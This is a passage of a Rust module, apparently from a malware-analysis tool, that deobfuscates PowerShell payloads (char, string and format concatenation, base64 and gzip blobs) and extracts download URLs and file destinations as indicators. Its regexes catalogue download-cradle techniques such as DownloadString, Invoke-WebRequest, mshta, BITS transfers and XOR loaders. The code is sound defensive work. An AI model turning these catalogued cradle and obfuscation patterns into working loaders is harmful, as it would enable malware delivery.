//! PowerShell payload post-processing: extract URLs and other IOCs from
//! the decoded ps1 content of `env.exec_ps1` / `env.all_extracted_ps1`.
//!
//! Runs our regex-based obfuscation expander over the raw payload, then
//! applies URL-extraction patterns to the simplified source.

#![allow(clippy::items_after_test_module)]

use crate::env::{Environment, FsEntry};
use crate::traits::Trait;
use crate::util::{
    contains_ascii_case_insensitive, find_ascii_case_insensitive, find_ascii_case_insensitive_from,
    floor_char_boundary, looks_like_liberal_url, snippet_prefix,
};
use base64::Engine as _;
use once_cell::sync::Lazy;
use regex::Regex;

// Regex-set patterns. Each capture group #1 is the URL.
// Patterns target common cmdlet/method invocations. Whitespace-tolerant,
// case-insensitive, supports single+double quoted strings.

#[allow(clippy::expect_used)] // regex literals — compile-time constants
static IWR_RE: Lazy<Regex> = Lazy::new(|| {
    // Invoke-WebRequest / iwr / wget / curl (PS alias) — optional -Uri, quoted or unquoted URL
    Regex::new(
        r#"(?i)(?:Invoke-WebRequest|iwr|wget|curl)\b(?:\s+-[A-Za-z][\w-]*)*\s*(?:[^\n|;]*?-Uri\s+)?\(?\s*["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"'\);]+)["']?"#
    ).expect("iwr")
});

#[allow(clippy::expect_used)]
static IRM_RE: Lazy<Regex> = Lazy::new(|| {
    // Invoke-RestMethod / irm — optional -Uri, quoted or unquoted URL
    Regex::new(
        r#"(?i)(?:Invoke-RestMethod|irm)\b(?:\s+-[A-Za-z][\w-]*)*\s*(?:[^\n|;]*?-Uri\s+)?\(?\s*["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"'\);]+)["']?"#
    ).expect("irm")
});

#[allow(clippy::expect_used)]
static PS_SCHEMELESS_IP_CMDLET_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|wget|curl)\b(?:\s+-[A-Za-z][\w-]*)*\s+(?:['"])?((?:\d{1,3}\.){3}\d{1,3}(?::\d+)?(?:/[^\s"'\);]*)?)(?:['"])?"#,
    )
    .expect("ps schemeless ip cmdlet")
});

#[allow(clippy::expect_used)]
static CURL_EXE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|[\s;"'])[\w:./\\-]*curl\.exe\b(?:\s+-[A-Za-z][\w-]*(?:\s+["']?[^"'\s]+["']?)?)*\s+["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"'\)]+)["']?"#,
    )
    .expect("curl exe")
});

#[allow(clippy::expect_used)]
static MSHTA_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\bmshta(?:\.exe)?\s+["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"';\)]+)["']?"#)
        .expect("mshta url")
});

#[allow(clippy::expect_used)]
static PS_GENERIC_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\b((?:https?|ftp|file):[\x2f\x5c]+[^\s"'`;,<>\)\]\}]+)"#)
        .expect("ps generic url")
});

#[allow(clippy::expect_used)]
static DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
    // (New-Object Net.WebClient).DownloadString('url') or .DownloadFile('url', 'dst')
    Regex::new(r#"(?i)\.Download(?:String|File|Data)\s*\(\s*["']([^"']+)["']"#).expect("ds")
});

#[allow(clippy::expect_used)]
static DOWNLOADFILE_DST_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(?:\.|\b)DownloadFile\s*\(\s*["'][^"']+["']\s*,\s*(?:"([^"]+)"|'([^']+)')"#)
        .expect("downloadfile dst")
});

#[allow(clippy::expect_used)]
static BARE_DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\bDownload(?:String|File|Data)\s*\(\s*["']([^"']+)["']"#)
        .expect("bare downloadstring")
});

#[allow(clippy::expect_used)]
static DOWNLOADSTRING_FRAGMENT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\b(?:loadString|ADSTRING)\s*\(\s*'{1,2}(https?://[^'")]+)"#)
        .expect("downloadstring fragment")
});

#[allow(clippy::expect_used)]
static CALLBYNAME_DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)CallByname\s*\([^)]*?["']DownloadString["'][^)]*?["'](https?://[^"']+)["']"#)
        .expect("callbyname downloadstring")
});

#[allow(clippy::expect_used)]
static SELF_B64_MATCH_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)-match\s*['"]([^'"]{4,200}?)\(\[A-Za-z0-9\+/\=\]\+\)['"]"#)
        .expect("self b64 match regex")
});

#[allow(clippy::expect_used)]
static FILE_B64_XOR_LOADER_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(\d{1,3})\s*;.*?\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\(\s*(?:gc|Get-Content)\s*['"]([^'"]+)['"]\s*\)\s*-join\s*['"]{2}.*?\[Convert\]::FromBase64String\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\).*?-bxor\s*\$([A-Za-z_][A-Za-z0-9_]*)"#,
    )
    .expect("file b64 xor loader regex")
});

#[allow(clippy::expect_used)]
static START_BITS_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)Start-BitsTransfer\s+(?:[^|]*?-Source\s+)?["']([^"']+)["']"#).expect("bits")
});

#[allow(clippy::expect_used)]
static NET_REQ_RE: Lazy<Regex> = Lazy::new(|| {
    // [Net.WebRequest]::Create('url')  /  [System.Net.WebRequest]::Create('url')
    Regex::new(r#"(?i)\[(?:System\.)?Net\.WebRequest\]::Create\s*\(\s*["']([^"']+)["']"#)
        .expect("netreq")
});

#[allow(clippy::expect_used)]
static DYNAMIC_DOWNLOAD_INVOKE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\.\s*\(?\s*["'](?:Download(?:String|File|Data)|Down)["']\s*\)?\s*\.Invoke\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*)|["']([^"']+)["'])"#,
    )
    .expect("dynamic download invoke")
});

#[allow(clippy::expect_used)]
static FOREACH_LITERAL_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)foreach\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s+in\s+@\(\s*(.*?)\s*\)\s*\)"#)
        .expect("foreach literal array")
});

#[allow(clippy::expect_used)]
static PS_ARRAY_LITERAL_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*@\(\s*(.*?)\s*\)"#)
        .expect("ps array literal assignment")
});

#[allow(clippy::expect_used)]
static FOREACH_ARRAY_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)foreach\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s+in\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
    )
    .expect("foreach array variable")
});

#[allow(clippy::expect_used)]
static PS_QUOTED_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?s)'((?:[^'\\]|\\.)*)'|"((?:[^"\\]|\\.)*)""#).expect("ps quoted literal")
});

#[allow(clippy::expect_used)]
static OUTFILE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)-OutF(?:ile)?(?:\s+|:)(?:"([^"\r\n;]+)"?|'([^'\r\n;]+)'?|([^"'\s;]+))"#)
        .expect("outfile")
});

#[allow(clippy::expect_used)]
static CURL_OUTPUT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|\s)(?:-o|--output)(?:\s+|[:=])(?:"([^"\r\n;]+)"?|'([^'\r\n;]+)'?|([^"'\s;]+))"#,
    )
    .expect("curl output")
});

#[allow(clippy::expect_used)]
static BITS_DESTINATION_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)-Dest(?:ination)?(?:\s+|:)(?:"([^"\r\n;]+)"?|'([^'\r\n;]+)'?|([^"'\s;]+))"#)
        .expect("bits destination")
});

// ---- PowerShell obfuscation expansion pre-pass ----

fn logical_statement_at(text: &str, pos: usize) -> &str {
    let start = text[..pos]
        .rfind(['\r', '\n', ';'])
        .map_or(0, |idx| idx + 1);
    let end = text[pos..]
        .find(['\r', '\n', ';'])
        .map_or(text.len(), |idx| pos + idx);
    text[start..end].trim()
}

fn outfile_hint_from(text: &str) -> Option<String> {
    OUTFILE_RE
        .captures(text)
        .or_else(|| CURL_OUTPUT_RE.captures(text))
        .or_else(|| BITS_DESTINATION_RE.captures(text))
        .or_else(|| DOWNLOADFILE_DST_RE.captures(text))
        .and_then(|c| capture_first_group(&c))
        .or_else(|| bits_positional_destination_from(text))
}

fn capture_first_group(captures: &regex::Captures<'_>) -> Option<String> {
    captures
        .iter()
        .skip(1)
        .flatten()
        .next()
        .map(|m| m.as_str().to_string())
}

fn bits_positional_destination_from(text: &str) -> Option<String> {
    if !contains_ascii_case_insensitive(text, "start-bitstransfer") {
        return None;
    }
    let literals: Vec<String> = PS_QUOTED_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            caps.get(1)
                .or_else(|| caps.get(2))
                .map(|m| m.as_str().to_string())
        })
        .collect();
    let url_idx = literals.iter().position(|literal| {
        crate::deob_scan::normalize_liberal_url_token(&clean_ps_url(literal)).is_some()
    })?;
    literals
        .iter()
        .skip(url_idx + 1)
        .find(|literal| crate::deob_scan::normalize_liberal_url_token(literal).is_none())
        .cloned()
}

#[allow(clippy::expect_used)]
static CHAR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    // Must have at least two + separators (3+ [char] terms) to avoid matching plain [char]N
    Regex::new(r"(?i)(?:\[char\]\s*\(?\s*(?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*\s*\)?\s*\+\s*){2,}\[char\]\s*\(?\s*(?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*\s*\)?")
        .expect("char concat regex")
});

#[allow(clippy::expect_used)]
static CHAR_INNER_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)\[char\]\s*\(?\s*((?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*)\s*\)?",
    )
    .expect("inner char regex")
});

#[allow(clippy::expect_used)]
static CHAR_LITERAL_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[char\]\s*\(?\s*((?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*)\s*\)?\s*\+\s*(?:'((?:''|[^'])*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)")"#,
    )
    .expect("char literal concat regex")
});

fn expand_char_concat(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "[char]") || !text.contains('+') {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = CHAR_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            let s = m.as_str();
            let mut chars = Vec::new();
            // Inner regex to extract each [char]N value
            for cap in CHAR_INNER_RE.captures_iter(s) {
                let n = parse_ps_char_codepoint(cap.get(1)?.as_str())?;
                if let Some(c) = char::from_u32(n) {
                    chars.push(c);
                }
            }
            let s_out: String = chars.into_iter().collect();
            Some((m.start(), m.end(), format!("'{}'", s_out)))
        })
        .collect();
    let mut result = text.to_string();
    // Apply replacements in reverse so byte offsets stay valid
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

fn expand_char_literal_concat(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "[char]") || !text.contains('+') {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = CHAR_LITERAL_CONCAT_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let ch = char::from_u32(parse_ps_char_codepoint(caps.get(1)?.as_str())?)?;
            let literal = caps
                .get(2)
                .map(|m| m.as_str().replace("''", "'"))
                .or_else(|| caps.get(3).map(|m| m.as_str().to_string()))?;
            let value = format!("{ch}{literal}").replace('\'', "''");
            Some((full.start(), full.end(), format!("'{value}'")))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

fn parse_ps_char_codepoint(expr: &str) -> Option<u32> {
    let expr = expr.trim();
    if expr.is_empty() {
        return None;
    }
    if let Some(value) = parse_ps_char_codepoint_atom(expr) {
        return Some(value);
    }

    let mut acc = 0i64;
    let mut sign = 1i64;
    let mut start = 0usize;
    let mut saw_operator = false;
    let mut saw_term = false;
    let bytes = expr.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'+' | b'-' => {
                let term = expr[start..i].trim();
                if term.is_empty() {
                    if !saw_term {
                        sign = if bytes[i] == b'-' { -1 } else { 1 };
                        start = i + 1;
                        i += 1;
                        continue;
                    }
                    return None;
                }
                acc += sign * i64::from(parse_ps_char_codepoint_atom(term)?);
                saw_term = true;
                saw_operator = true;
                sign = if bytes[i] == b'-' { -1 } else { 1 };
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    let term = expr[start..].trim();
    if term.is_empty() {
        return None;
    }
    acc += sign * i64::from(parse_ps_char_codepoint_atom(term)?);
    if saw_operator && (0..=i64::from(u32::MAX)).contains(&acc) {
        Some(acc as u32)
    } else {
        None
    }
}

fn parse_ps_char_codepoint_atom(expr: &str) -> Option<u32> {
    let expr = expr.trim();
    if let Some(stripped) = expr.strip_prefix("0x").or_else(|| expr.strip_prefix("0X")) {
        u32::from_str_radix(stripped, 16).ok()
    } else {
        expr.parse().ok()
    }
}

#[cfg(test)]
mod char_concat_prefilter_tests {
    use super::expand_char_concat;

    #[test]
    fn ignores_text_without_char_concat_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_char_concat(text), text);
    }
}

#[allow(clippy::expect_used)]
static STR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    // Match runs of (quoted-string + )+ quoted-string.
    Regex::new(r#"(?:'(?:[^'\\]|\\.)*'\s*\+\s*)+'(?:[^'\\]|\\.)*'"#).expect("str concat regex")
});

#[allow(clippy::expect_used)]
static STR_PART_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"'((?:[^'\\]|\\.)*)'"#).expect("string part regex"));

fn expand_string_concat(text: &str) -> String {
    if !text.contains('\'') || !text.contains('+') {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = STR_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            if !is_string_concat_start(text, m.start()) {
                return None;
            }
            let s = m.as_str();
            let mut combined = String::new();
            for cap in STR_PART_RE.captures_iter(s) {
                let part_str = cap.get(1)?.as_str();
                combined.push_str(part_str);
            }
            Some((m.start(), m.end(), format!("'{}'", combined)))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

#[cfg(test)]
mod string_concat_prefilter_tests {
    use super::{expand_double_string_concat, expand_string_concat};

    #[test]
    fn ignores_text_without_string_concat_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_string_concat(text), text);
        assert_eq!(expand_double_string_concat(text), text);
    }
}

#[allow(clippy::expect_used)]
static DQ_STR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?:\"(?:[^\"\\]|\\.)*\"\s*\+\s*)+\"(?:[^\"\\]|\\.)*\""#)
        .expect("double quoted str concat regex")
});

#[allow(clippy::expect_used)]
static DQ_STR_PART_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"\"((?:[^\"\\]|\\.)*)\""#).expect("double string part regex"));

fn expand_double_string_concat(text: &str) -> String {
    if !text.contains('"') || !text.contains('+') {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = DQ_STR_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            if !is_string_concat_start(text, m.start()) {
                return None;
            }
            let s = m.as_str();
            let mut combined = String::new();
            for cap in DQ_STR_PART_RE.captures_iter(s) {
                combined.push_str(cap.get(1)?.as_str());
            }
            Some((m.start(), m.end(), format!("'{}'", combined)))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

fn is_string_concat_start(text: &str, pos: usize) -> bool {
    match previous_non_whitespace_ascii_byte(text, pos) {
        None => true,
        Some(b) => matches!(
            b,
            b'=' | b'(' | b'[' | b'{' | b',' | b';' | b':' | b'?' | b'+'
        ),
    }
}

#[allow(clippy::expect_used)]
static DOUBLED_QUOTE_LITERAL_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"''([^'\r\n]{1,8192})''"#).expect("doubled quote literal"));

fn expand_doubled_quote_literals(text: &str) -> String {
    if !text.contains("''") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = DOUBLED_QUOTE_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let inner = caps.get(1)?.as_str();
            Some((full.start(), full.end(), format!("'{inner}'")))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[allow(clippy::expect_used)]
static FORMAT_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\(?\s*(?:'([^']*)'|"([^"]*)")\s*\)?\s*-f\s*((?:(?:'[^']*'|"[^"]*")\s*,\s*)*(?:'[^']*'|"[^"]*"))"#,
    )
    .expect("format literal")
});

#[allow(clippy::expect_used)]
static FORMAT_CONCAT_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\(?\s*((?:'[^']*'\s*\+\s*)+'[^']*')\s*\)?\s*-f\s*((?:'[^']*'\s*,\s*)*'[^']*')"#)
        .expect("format concat literal")
});

#[allow(clippy::expect_used)]
static FORMAT_ARG_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"'([^']*)'|"([^"]*)""#).expect("format arg literal"));

fn expand_format_literals(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-f") {
        return text.to_string();
    }
    let concat_matches: Vec<(usize, usize, String)> = FORMAT_CONCAT_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let template_parts = caps.get(1)?.as_str();
            let mut template = String::new();
            for part in STR_PART_RE.captures_iter(template_parts) {
                template.push_str(part.get(1)?.as_str());
            }
            let args = caps.get(2)?.as_str();
            Some((
                full.start(),
                full.end(),
                format_format_literal(template, args)?,
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in concat_matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }

    let matches: Vec<(usize, usize, String)> = FORMAT_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let template = caps
                .get(1)
                .or_else(|| caps.get(2))
                .map(|m| m.as_str().to_string())?;
            let args = caps.get(3)?.as_str();
            let before = text[..full.start()].trim_end();
            if before.ends_with('+') {
                return None;
            }
            Some((
                full.start(),
                full.end(),
                format_format_literal(template, args)?,
            ))
        })
        .collect();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod format_literal_prefilter_tests {
    use super::expand_format_literals;

    #[test]
    fn ignores_text_without_format_operator() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_format_literals(text), text);
    }
}

#[cfg(test)]
mod marker_noise_prefilter_tests {
    use super::should_skip_marker_noise_line;

    #[test]
    fn ignores_plain_text_without_marker_noise_shape() {
        assert!(!should_skip_marker_noise_line("Write-Host hello world"));
    }
}

fn format_format_literal(mut template: String, args: &str) -> Option<String> {
    for (idx, part) in FORMAT_ARG_RE.captures_iter(args).enumerate() {
        let value = part.get(1).or_else(|| part.get(2))?.as_str();
        template = template.replace(&format!("{{{idx}}}"), value);
    }
    Some(format!("'{}'", template))
}

#[allow(clippy::expect_used)]
static B64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*['"]([A-Za-z0-9+/=]+)['"]\s*\)"#,
    )
    .expect("b64 literal regex")
});

#[allow(clippy::expect_used)]
static GETSTRING_B64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(*\s*['"]([A-Za-z0-9+/=\s]+)['"]\s*(?:\.\s*Trim(?:Start|End)?\s*\(\s*\))?\s*\)*\s*\)\s*\)"#,
    )
    .expect("getstring b64 literal regex")
});

#[allow(clippy::expect_used)]
static GETSTRING_B64_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(*\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\.\s*Trim(?:Start|End)?\s*\(\s*\))?\s*\)*\s*\)\s*\)"#,
    )
    .expect("getstring b64 var regex")
});

#[allow(clippy::expect_used)]
static GETSTRING_BYTE_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\[\s*byte\s*\[\]\s*\]\s*@?\(\s*((?:0x[0-9a-f]+|\d+)\s*(?:,\s*(?:0x[0-9a-f]+|\d+)\s*){3,})\)\s*\)"#,
    )
    .expect("getstring byte array regex")
});

#[allow(clippy::expect_used)]
static FROMB64_LONG_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)FromBase64String\s*\(\s*['"]([A-Za-z0-9+/=]{40,})['"]"#)
        .expect("long frombase64 literal regex")
});

#[allow(clippy::expect_used)]
static GZIP_B64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(*\s*['"]([A-Za-z0-9+/=]+)['"]\s*\)*\s*\)"#,
    )
    .expect("gzip b64 literal regex")
});

#[allow(clippy::expect_used)]
static PS_LONG_B64_VAR_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*["']([A-Za-z0-9+/=]{256,})["']"#)
        .expect("ps long b64 var assign regex")
});

#[allow(clippy::expect_used)]
static PS_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\bfunction\s+([A-Za-z_][A-Za-z0-9_]*)\b"#).expect("ps function def regex")
});

#[allow(clippy::expect_used)]
static PS_GZIP_FUNCTION_GETSTRING_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\[(?:System\.)?(?:Text\.)?Encoding\]::(?:UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\(*\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*\(*\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*\)*\s*\)\s*\)*\s*\)\s*(?:\.TrimEnd\s*\([^)]*\))?"#,
    )
    .expect("ps gzip function getstring var regex")
});

#[allow(clippy::expect_used)]
static READ_TO_END_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)\.ReadToEnd\s*\(\s*\)"#).expect("readtoend regex"));

#[allow(clippy::expect_used)]
static JSON_SCRIPT_B64_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(\s*'\{[^']*"Script"\s*:\s*"([A-Za-z0-9+/=]+)"[^']*\}'\s*\|\s*ConvertFrom-Json\s*\)\.Script\s*\)"#,
    )
    .expect("json script b64 regex")
});

fn expand_gzip_base64_literals(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "gzipstream")
        || !contains_ascii_case_insensitive(text, "frombase64string")
    {
        return text.to_string();
    }

    let matches: Vec<(usize, usize, String)> = GZIP_B64_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let b64 = caps.get(1)?.as_str();
            let decoded = decode_ps_base64_string(b64)?;
            let inflated = crate::aes_chain::crypto::gunzip(&decoded, 2 * 1024 * 1024).ok()?;
            let s = decode_payload(&inflated).into_owned().replace('\'', "''");
            let (start, end) = gzip_wrapper_bounds(text, full.start(), full.end())
                .unwrap_or((full.start(), full.end()));
            Some((start, end, format!("'{s}'")))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod gzip_base64_prefilter_tests {
    use super::{
        expand_gzip_base64_literals, expand_gzip_function_base64_variables, gzip_wrapper_bounds,
    };

    #[test]
    fn ignores_text_without_gzip_base64_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_gzip_base64_literals(text), text);
    }

    #[test]
    fn finds_mixed_case_wrapper_bounds() {
        let text = "New-Object System.IO.StreamReader; [Convert]::FromBase64String('QUJDRA=='); GZipStream; MemoryStream; .ReadToEnd()";
        let b64_start = text.find("QUJDRA==");
        assert!(b64_start.is_some(), "b64 start");
        let b64_start = b64_start.unwrap_or_default();
        let b64_end = b64_start + "QUJDRA==".len();
        let bounds = gzip_wrapper_bounds(text, b64_start, b64_end);
        assert!(bounds.is_some(), "wrapper bounds");
        let bounds = bounds.unwrap_or_default();
        assert_eq!(bounds.0, 0);
        assert!(bounds.1 > b64_end);
    }

    #[test]
    fn long_non_ascii_tail_does_not_panic_at_scan_cap() {
        let prefix = "New-Object System.IO.StreamReader; [Convert]::FromBase64String('QUJDRA==')";
        let text = format!("{prefix}A{}", "é".repeat(8192));
        assert!(gzip_wrapper_bounds(&text, prefix.len(), prefix.len()).is_none());
    }

    #[test]
    fn long_non_ascii_function_body_does_not_panic_at_scan_cap() {
        let b64 = "A".repeat(256);
        let text = format!(
            "$blob = '{b64}'; GZipStream; [Convert]::FromBase64String($blob); function Inflate {}",
            "é".repeat(4096)
        );
        assert_eq!(expand_gzip_function_base64_variables(&text), text);
    }
}

fn expand_gzip_function_base64_variables(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "gzipstream")
        || !contains_ascii_case_insensitive(text, "frombase64string")
    {
        return text.to_string();
    }

    let mut b64_vars = std::collections::HashMap::new();
    for caps in PS_LONG_B64_VAR_ASSIGN_RE.captures_iter(text).take(32) {
        let Some(name) = caps.get(1) else { continue };
        let Some(value) = caps.get(2) else { continue };
        if value.as_str().len() <= 2 * 1024 * 1024 {
            b64_vars.insert(name.as_str().to_ascii_lowercase(), value.as_str());
        }
    }
    if b64_vars.is_empty() {
        return text.to_string();
    }

    let mut gzip_functions = std::collections::HashSet::new();
    for caps in PS_FUNCTION_DEF_RE.captures_iter(text) {
        let Some(full) = caps.get(0) else { continue };
        let Some(name) = caps.get(1) else { continue };
        let body_end = floor_char_boundary(text, full.end().saturating_add(4096));
        if contains_ascii_case_insensitive(&text[full.end()..body_end], "gzipstream") {
            gzip_functions.insert(name.as_str().to_ascii_lowercase());
        }
    }
    if gzip_functions.is_empty() {
        return text.to_string();
    }

    let matches: Vec<(usize, usize, String)> = PS_GZIP_FUNCTION_GETSTRING_VAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let out_var = caps.get(1)?.as_str();
            let function_name = caps.get(2)?.as_str().to_ascii_lowercase();
            if !gzip_functions.contains(&function_name) {
                return None;
            }
            let b64_var = caps.get(3)?.as_str().to_ascii_lowercase();
            let b64 = b64_vars.get(&b64_var)?;
            let decoded = decode_ps_base64_string(b64)?;
            let inflated = crate::aes_chain::crypto::gunzip(&decoded, 4 * 1024 * 1024).ok()?;
            let s = decode_payload(&inflated).into_owned().replace('\'', "''");
            Some((full.start(), full.end(), format!("${out_var} = '{s}'")))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn gzip_wrapper_bounds(text: &str, b64_start: usize, b64_end: usize) -> Option<(usize, usize)> {
    let start =
        find_ascii_case_insensitive(&text[..b64_start], "new-object system.io.streamreader")?;
    let after_end = floor_char_boundary(text, b64_end.saturating_add(8192));
    let after = &text[b64_end..after_end];
    let read_to_end = READ_TO_END_RE.find(after)?;
    let end = b64_end + read_to_end.end();
    let wrapper = &text[start..end];
    if !contains_ascii_case_insensitive(wrapper, "gzipstream")
        || !contains_ascii_case_insensitive(wrapper, "memorystream")
    {
        return None;
    }
    Some((start, end))
}

fn expand_json_script_base64(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "convertfrom-json") {
        return text.to_string();
